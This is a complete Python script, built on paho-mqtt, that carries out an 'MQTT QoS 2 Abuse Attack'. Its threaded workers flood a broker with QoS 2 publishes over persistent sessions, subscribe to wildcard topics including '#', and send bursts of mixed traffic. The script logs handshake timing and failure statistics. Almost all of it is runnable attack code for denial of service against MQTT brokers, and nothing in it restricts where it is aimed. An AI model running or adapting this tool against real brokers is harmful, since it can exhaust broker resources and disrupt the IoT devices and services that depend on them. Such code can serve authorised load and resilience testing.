import argparse
import csv
import json
import os
import random
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

class QoS2AbuseAttack:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        
        self.messages_published = 0
        self.messages_received = 0
        self.pubrec_received = 0
        self.pubcomp_received = 0
        self.qos2_handshake_failures = 0
        
        self.pending_qos2_messages = {}
        self.qos2_lock = threading.Lock()

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow([
                "timestamp_utc", "client_id", "worker_id", "message_id", "topic", 
                "action", "qos", "payload_size", "handshake_step", "status", "details"
            ])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log_qos2_event(self, client_id, worker_id, message_id, topic, action, qos=2, 
                      payload_size=0, handshake_step="", status="", details=""):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([
                datetime.now(timezone.utc).isoformat(),
                client_id, worker_id, message_id, topic, action, qos, 
                payload_size, handshake_step, status, details
            ])

    def generate_qos2_payload(self, size_kb=1):
        if self.args.payload_type == "random":
            size_bytes = size_kb * 1024
            payload = {
                "timestamp": datetime.now().isoformat(),
                "qos": 2,
                "data": ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") 
                               for _ in range(size_bytes - 200))
            }
        elif self.args.payload_type == "binary":
            payload = bytes([random.randint(0, 255) for _ in range(size_kb * 1024)])
        else:
            payload = {
                "device_id": f"device_{random.randint(1, 1000):04d}",
                "timestamp": datetime.now().isoformat(),
                "qos_level": 2,
                "measurements": {
                    "temperature": round(random.uniform(-10, 50), 2),
                    "humidity": round(random.uniform(0, 100), 2),
                    "pressure": round(random.uniform(950, 1050), 2),
                    "light": random.randint(0, 1000),
                },
                "status": random.choice(["normal", "warning", "critical"]),
                "metadata": {
                    "firmware_version": "v2.1.0",
                    "battery_level": random.randint(0, 100),
                    "signal_strength": random.randint(-100, -20)
                }
            }
        
        return json.dumps(payload) if isinstance(payload, dict) else payload

    def qos2_flood_worker(self, worker_id):
        client_id = f"{self.args.client_prefix}_flood_{worker_id:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=False)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)
        
        message_states = {}
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                print(f"[Worker {worker_id}] Connected with session_present={flags.get('session_present', False)}")
                self.log_qos2_event(client_id, worker_id, 0, "", "connect", status="success", 
                                  details=f"rc={rc},session_present={flags.get('session_present', False)}")
            else:
                self.log_qos2_event(client_id, worker_id, 0, "", "connect", status="failed", details=f"rc={rc}")
        
        def on_publish(client, userdata, mid):
            with self.qos2_lock:
                self.messages_published += 1
                message_states[mid] = {"state": "PUBLISH_SENT", "timestamp": time.time()}
            
            self.log_qos2_event(client_id, worker_id, mid, "", "publish", handshake_step="PUBLISH", 
                              status="sent", details="waiting_for_pubrec")
        
        def on_subscribe(client, userdata, mid, granted_qos):
            self.log_qos2_event(client_id, worker_id, mid, "", "subscribe", qos=granted_qos[0] if granted_qos else 0, 
                              status="granted", details=f"granted_qos={granted_qos}")
        
        def on_message(client, userdata, msg):
            with self.qos2_lock:
                self.messages_received += 1
            
            payload_preview = str(msg.payload[:100])[2:-1] if len(msg.payload) > 100 else str(msg.payload)[2:-1]
            self.log_qos2_event(client_id, worker_id, 0, msg.topic, "message_received", 
                              qos=msg.qos, payload_size=len(msg.payload), status="received", 
                              details=f"payload_preview={payload_preview[:50]}")
        
        def on_pubrec(client, userdata, mid):
            with self.qos2_lock:
                self.pubrec_received += 1
                if mid in message_states:
                    message_states[mid]["state"] = "PUBREC_RECEIVED"
                    message_states[mid]["pubrec_time"] = time.time()
            
            self.log_qos2_event(client_id, worker_id, mid, "", "qos2_handshake", 
                              handshake_step="PUBREC", status="received", details="sending_pubrel")
        
        def on_pubcomp(client, userdata, mid):
            with self.qos2_lock:
                self.pubcomp_received += 1
                if mid in message_states:
                    start_time = message_states[mid]["timestamp"]
                    total_time = time.time() - start_time
                    del message_states[mid]
                    details = f"total_handshake_time={total_time:.3f}s"
                else:
                    details = "unexpected_pubcomp"
            
            self.log_qos2_event(client_id, worker_id, mid, "", "qos2_handshake", 
                              handshake_step="PUBCOMP", status="received", details=details)
        
        client.on_connect = on_connect
        client.on_publish = on_publish
        client.on_subscribe = on_subscribe
        client.on_message = on_message
        
        client.on_pubrec = on_pubrec
        client.on_pubcomp = on_pubcomp
        
        connected = False
        while not connected and not self.stop_event.is_set():
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                connected = True
            except Exception as e:
                print(f"[Worker {worker_id}] Connection failed: {e}, retrying...")
                time.sleep(5)
        
        if not connected:
            return
        
        response_topic = f"qos2/response/{worker_id}/+"
        client.subscribe(response_topic, qos=2)
        
        message_interval = 1.0 / self.args.message_rate if self.args.message_rate > 0 else 1.0
        message_count = 0
        
        topics = [
            f"qos2/flood/{worker_id}/data",
            f"qos2/flood/{worker_id}/telemetry", 
            f"qos2/flood/{worker_id}/events",
            f"qos2/flood/{worker_id}/commands",
            f"qos2/flood/{worker_id}/status"
        ]
        
        try:
            while not self.stop_event.is_set() and message_count < self.args.max_messages_per_worker:
                topic = random.choice(topics)
                payload = self.generate_qos2_payload(self.args.payload_size_kb)
                
                try:
                    result = client.publish(topic, payload, qos=2)
                    
                    if result.rc == mqtt.MQTT_ERR_SUCCESS:
                        message_count += 1
                        if message_count % 100 == 0:
                            print(f"[Worker {worker_id}] Published {message_count} QoS 2 messages")
                    else:
                        with self.qos2_lock:
                            self.qos2_handshake_failures += 1
                        self.log_qos2_event(client_id, worker_id, result.mid, topic, "publish", 
                                          payload_size=len(str(payload)), status="failed", 
                                          details=f"result_code={result.rc}")
                
                except Exception as e:
                    with self.qos2_lock:
                        self.qos2_handshake_failures += 1
                    self.log_qos2_event(client_id, worker_id, 0, topic, "publish", status="exception", 
                                      details=str(e))
                
                time.sleep(message_interval)
        
        except KeyboardInterrupt:
            pass
        finally:
            try:
                client.loop_stop()
                client.disconnect()
                print(f"[Worker {worker_id}] Disconnected after {message_count} messages")
            except:
                pass

    def qos2_subscription_abuse(self, worker_id):
        client_id = f"{self.args.client_prefix}_sub_{worker_id:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=False)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                subscription_topics = [
                    "qos2/+/data",
                    "qos2/+/telemetry",
                    "qos2/+/events", 
                    "qos2/flood/+/+",
                    "iot/+/sensor/+",
                    "system/+/status",
                    "devices/+/qos2/+",
                    "#"  # Subscribe to all topics
                ]
                
                for topic in subscription_topics:
                    client.subscribe(topic, qos=2)
                    self.log_qos2_event(client_id, worker_id, 0, topic, "subscribe", 
                                      qos=2, status="requested")
                    time.sleep(0.1)
        
        def on_message(client, userdata, msg):
            with self.qos2_lock:
                self.messages_received += 1
            
            payload_size = len(msg.payload)
            self.log_qos2_event(client_id, worker_id, 0, msg.topic, "qos2_message_received", 
                              qos=msg.qos, payload_size=payload_size, status="processing")
        
        client.on_connect = on_connect
        client.on_message = on_message
        
        try:
            client.connect(self.args.broker, self.args.port, self.args.keepalive)
            client.loop_start()
            
            while not self.stop_event.is_set():
                time.sleep(5)
                print(f"[Worker {worker_id}] QoS 2 subscription active, received: {self.messages_received}")
        
        except Exception as e:
            print(f"[Worker {worker_id}] Subscription worker exception: {e}")
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def qos2_mixed_abuse(self, worker_id):
        client_id = f"{self.args.client_prefix}_mixed_{worker_id:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=False)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)
        
        handshake_times = []
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                mixed_topics = [f"mixed/{worker_id}/topic_{i}" for i in range(10)]
                for topic in mixed_topics:
                    client.subscribe(topic, qos=2)
        
        def on_publish(client, userdata, mid):
            self.log_qos2_event(client_id, worker_id, mid, "", "mixed_publish", status="sent")
        
        def on_pubrec(client, userdata, mid):
            handshake_times.append({"mid": mid, "pubrec_time": time.time()})
        
        def on_pubcomp(client, userdata, mid):
            for hs in handshake_times:
                if hs["mid"] == mid:
                    handshake_duration = time.time() - hs["pubrec_time"]
                    self.log_qos2_event(client_id, worker_id, mid, "", "mixed_handshake", 
                                      status="completed", details=f"duration={handshake_duration:.3f}s")
                    handshake_times.remove(hs)
                    break
        
        client.on_connect = on_connect
        client.on_publish = on_publish
        client.on_pubrec = on_pubrec
        client.on_pubcomp = on_pubcomp
        
        try:
            client.connect(self.args.broker, self.args.port, self.args.keepalive)
            client.loop_start()
            
            message_count = 0
            while not self.stop_event.is_set() and message_count < self.args.max_messages_per_worker // 2:
                for i in range(5):
                    topic = f"mixed/{worker_id}/burst_{message_count}_{i}"
                    payload = self.generate_qos2_payload(random.randint(1, 5))
                    client.publish(topic, payload, qos=2)
                    time.sleep(0.1)
                
                message_count += 5
                time.sleep(random.uniform(1, 3))
        
        except Exception as e:
            print(f"[Worker {worker_id}] Mixed worker exception: {e}")
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def attack_worker(self, worker_id):
        attack_type = worker_id % 3
        
        try:
            if attack_type == 0:
                self.qos2_flood_worker(worker_id)
            elif attack_type == 1:
                self.qos2_subscription_abuse(worker_id)
            else:
                self.qos2_mixed_abuse(worker_id)
                
        except Exception as e:
            print(f"[Worker {worker_id}] Worker exception: {e}")

    def run(self):
        print(f"Starting QoS 2 Abuse attack with {self.args.workers} workers")
        print(f"Target: {self.args.broker}:{self.args.port}")
        print(f"Message rate: {self.args.message_rate} msgs/sec per worker")
        print(f"Payload size: {self.args.payload_size_kb} KB")
        print(f"Max messages per worker: {self.args.max_messages_per_worker}")
        
        threads = []
        for i in range(self.args.workers):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.2)
        
        try:
            while True:
                time.sleep(10)
                with self.qos2_lock:
                    print(f"\n=== QoS 2 Abuse Statistics ===")
                    print(f"Messages published: {self.messages_published}")
                    print(f"Messages received: {self.messages_received}")
                    print(f"PUBREC received: {self.pubrec_received}")
                    print(f"PUBCOMP received: {self.pubcomp_received}")
                    print(f"Handshake failures: {self.qos2_handshake_failures}")
                    
                    if self.messages_published > 0:
                        completion_rate = (self.pubcomp_received / self.messages_published) * 100
                        print(f"QoS 2 completion rate: {completion_rate:.1f}%")
                    print("=============================\n")
                
        except KeyboardInterrupt:
            print("\nStopping QoS 2 abuse attack...")
            self.stop_event.set()
            
            for thread in threads:
                thread.join(timeout=15)
            
            print(f"\nQoS 2 abuse attack completed!")
            print(f"Final statistics:")
            print(f"  Messages published: {self.messages_published}")
            print(f"  Messages received: {self.messages_received}")
            print(f"  PUBREC received: {self.pubrec_received}")
            print(f"  PUBCOMP received: {self.pubcomp_received}")
            print(f"  Handshake failures: {self.qos2_handshake_failures}")

def main():
    parser = argparse.ArgumentParser(description="MQTT QoS 2 Abuse Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--keepalive", type=int, default=60, help="Keepalive interval")
    
    parser.add_argument("--workers", type=int, default=6, help="Number of attack workers")
    
    parser.add_argument("--message-rate", type=float, default=5.0,
                       help="QoS 2 message rate per worker (msgs/sec)")
    
    parser.add_argument("--max-messages-per-worker", type=int, default=1000,
                       help="Maximum QoS 2 messages per worker")
    
    parser.add_argument("--payload-size-kb", type=int, default=2,
                       help="Payload size in KB")
    
    parser.add_argument("--payload-type", choices=["structured", "random", "binary"],
                       default="structured", help="Type of payload to generate")
    
    parser.add_argument("--client-prefix", default="qos2_attacker", help="Client ID prefix")
    
    parser.add_argument("--log-csv", help="CSV file to log attack details")
    
    args = parser.parse_args()
    
    attack = QoS2AbuseAttack(args)
    try:
        attack.run()
    finally:
        attack.close()

if __name__ == "__main__":
    main()
